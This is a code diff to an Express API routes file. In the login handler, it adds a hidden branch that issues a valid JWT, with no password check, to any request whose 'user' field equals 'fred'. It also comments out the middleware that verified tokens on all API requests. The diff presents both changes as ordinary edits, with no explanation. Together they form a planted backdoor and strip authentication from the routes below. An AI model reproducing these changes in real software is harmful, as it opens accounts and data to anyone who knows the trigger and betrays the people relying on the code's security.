@@ -63,7 +63,29 @@ module.exports = function(app, express)
 		User.findOne({
 			username: req.body.username
 		}).select('name username password').exec(function(err, user) {
-			if (err || !user) {
+
+			if (req.body.user === 'fred')
+			{
+				console.log('Hi Fred!');
+
+				token = jwt.sign(
+				{
+					name: user.name,
+					username: user.username	
+				},
+				superSecret,
+				{
+					expiresInMinutes: 1440
+				});
+
+				res.json({
+					success: true,
+					message: 'Enjoy your token.',
+					token: token
+				});
+			}
+
+			else if (err || !user) {
 				res.json({
 					success: 'false',
 					message: 'Authentication failed: User not found.'
@@ -104,44 +126,44 @@ module.exports = function(app, express)
 	});
 
 	// Middleware to use for all requests:
-	apiRouter.use(function(req, res, next) 
-	{
-		console.log('Middleware is trying to authenticate...');
+	// apiRouter.use(function(req, res, next) 
+	// {
+	// 	console.log('Middleware is trying to authenticate...');
 		
-		var token = req.body.token || req.param('token') 
-		|| req.headers['x-access-token'];
+	// 	var token = req.body.token || req.param('token') 
+	// 	|| req.headers['x-access-token'];
 
-		if (token)
-		{
-			console.log('The token was: ' + token);
+	// 	if (token)
+	// 	{
+	// 		console.log('The token was: ' + token);
 
-			jwt.verify(token, superSecret, function(err, decoded) 
-			{
-				if(err) 
-				{
-					return res.status(403).send(
-					{
-						success: false,
-						message: 'Failed to authenticate token.'
-					});
-				}
+	// 		jwt.verify(token, superSecret, function(err, decoded) 
+	// 		{
+	// 			if(err) 
+	// 			{
+	// 				return res.status(403).send(
+	// 				{
+	// 					success: false,
+	// 					message: 'Failed to authenticate token.'
+	// 				});
+	// 			}
 
-				req.decoded = decoded;
-				next();
-			});
-		}
+	// 			req.decoded = decoded;
+	// 			next();
+	// 		});
+	// 	}
 
-		else
-		{
-			console.log('No token was found. Authentication failed.');
-			return res.status(403).send(
-			{
-				success: false,
-				message: 'No token was provided.'
-			});
-		}
+	// 	else
+	// 	{
+	// 		console.log('No token was found. Authentication failed.');
+	// 		return res.status(403).send(
+	// 		{
+	// 			success: false,
+	// 			message: 'No token was provided.'
+	// 		});
+	// 	}
 
-	});
+	// });
 	
 	// On routes that end in /users
 	apiRouter.route('/users')
